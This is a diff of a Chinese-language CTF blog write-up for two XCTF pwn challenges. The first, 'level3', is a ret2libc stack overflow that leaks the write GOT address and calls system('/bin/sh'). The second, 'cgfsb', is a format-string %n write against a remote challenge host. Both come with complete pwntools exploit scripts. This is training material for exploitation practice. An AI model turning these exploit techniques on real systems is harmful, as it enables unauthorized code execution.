 <p>文件，再用winhex查看后，对比之前的elf文件发现，它文件头混入了一些奇怪的东西，</p>
 <p>待我把前面的东西都删除之后（删到elf前面的一个空格），它就变成一个正常的elf</p>
 <p>文件了。下面切入正题。</p>
-<p><img src="https://iy30.github.io/images/code/wps70.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120506477.png" alt="image-20210919120506477"></p>
 <p>Ida看看</p>
-<p><img src="https://iy30.github.io/images/code/wps71.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120509962.png" alt="image-20210919120509962"></p>
 <p>进vlun函数看看</p>
-<p><img src="https://iy30.github.io/images/code/wps72.jpg" alt="img"> </p>
-<p>可以看到，buf有明显的栈溢出漏洞。</p>
-<p>但是，看了看代码中没有可利用的system函数和bin/sh，于是需要伪造一份。</p>
-<p>思路：利用ret2libc的思想，先构造第一个payload，使其栈溢出到write函数，然后得</p>
-<p>到write的实际地址，然后通过LibcSearcher库将write的实际地址减去其偏移地址，得</p>
-<p>出基地址libcbase，之后通过基地址与对应函数的偏移，得到函数实际地址，并构造出</p>
-<p>最终的payload。</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120514227.png" alt="image-20210919120514227"></p>
+<p>可以看到，buf有明显的栈溢出漏洞。看到代码中没有可利用的system函数和bin/sh，于是需要手动获取。</p>
+<p>思路：利用ret2libc的思想，先构造第一个payload，使其栈溢出到write函数，传入参数write_plt然后得到write的实际地址，然后通过LibcSearcher库或者手动获取write的偏移地址，得出基地址libcbase，之后通过基地址与对应函数的偏移，得到函数实际地址，并构造出payload。</p>
 <p>Exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload1 = b&#x27;A&#x27;*0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + </span></span><br><span class="line"></span><br><span class="line">p32(write_got) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))				<span class="comment">#write的实际地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = u32(io.recv()[:4])</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)	<span class="comment">#得到偏移函数</span></span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)	<span class="comment">#用write的实际地址-libc中地址，来计算基</span></span><br><span class="line"></span><br><span class="line">地址</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)	<span class="comment">#基地址与对应函数的偏移便是其实际地址</span></span><br><span class="line"></span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-
-
-<p>总结：构造payload1时，如上图红色所示，需添加p32（1）这个数据，通过实验测试，</p>
-<p>p32（2）也行，但是其他的便不行了，原因未知。上图黄色的p32（4）通过测试发现</p>
-<p>只有p32里大于等于4时才行，并且只有等于4时，最后不会出现\0x00，如下图所示。<img src="https://iy30.github.io/images/code/image-20210915230921131.png" alt="image-20210915230921131"> </p>
-<p>原因未知。</p>
+<p>总结：构造payload1时，32位传参从右到左入栈，write的参数（1，write_plt，4）。</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120529101.png" alt="image-20210919120529101"></p>
+<hr>
 <h2 id="10、cgfsb（格式化字符串）"><a href="#10、cgfsb（格式化字符串）" class="headerlink" title="10、cgfsb（格式化字符串）"></a>10、cgfsb（格式化字符串）</h2><p>Checksec</p>
-<p><img src="https://iy30.github.io/images/code/wps73.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120533712.png" alt="image-20210919120533712"></p>
 <p>开了canary，ida看看</p>
-<p><img src="https://iy30.github.io/images/code/wps74.jpg" alt="img"> </p>
-<p>伪代码也很直接，先是输入一个名字，然后输入一段message，这里的printf函数可以</p>
-<p>做文章</p>
-<p><img src="https://iy30.github.io/images/code/wps75.jpg" alt="img"> </p>
-<p>可以看出aaaa对应的61616161在第十个（除了aaaa）</p>
-<p>利用格式化字符串的思想？：未理解。</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120537402.png" alt="image-20210919120537402"></p>
+<p>伪代码也很直接，先是输入一个名字，然后输入一段message，这里的printf函数可以利用。</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120544373.png" alt="image-20210919120544373"></p>
+<p>可以看出aaaa对应的61616161在第十个（除了开始的aaaa）</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919141046650.png" alt="image-20210919141046650"></p>
+<p>pwnme是bss段的一个全局变量，有了它的地址便可向其中传入想要的值了。注意其地址用p32打包后为4个字节，后边只需4个字节的deadbeef填充即可，这样传入的值便是8了。</p>
 <p>Exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">payload=p32(<span class="number">0x0804A068</span>)+<span class="string">b&quot;AAAA&quot;</span>+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">54527</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;please tell me your name:&quot;</span>,<span class="string">b&quot;nehs&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;leave your message please:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>测试1</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/IY30/IY30.github.io/blob/main/images/code/wps41.jpg">IY30.github.io/images/code at main · IY30/IY30.github.io · GitHub</a></p>
-<p>测试2</p>
-<p><img src="https://iy30.github.io/images/code/wps41.jpg" alt="img">)</p>
+<p>总结：</p>
+<ul>
+<li><p>利用到的函数：<strong>int printf（‘’格式化字符串“，参数）</strong>。</p>
+</li>
+<li><p>printf函数的格式化字符串常见的有%d，%f，%c，%s，%x(输出16进制数，前面没有0x),%p(输出16进制数，前面代有0x)等等。</p>
+</li>
+<li><p>还有个不常见的格式化字符串==<strong>%n</strong>==，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。<strong>除了%n还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong>注意是对应参数（这个参数是指针）的对应地址开始前几个字节。到底为几个字节还和程序的位数有关，如32位的程序，%n取得就是4字节指针，64位程序，取得就是8字节指针。这是因为不同位数的程序，每个参数对应的字节数是不同的。</p>
+</li>
+</ul>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p>
  
       <!-- reward -->
       
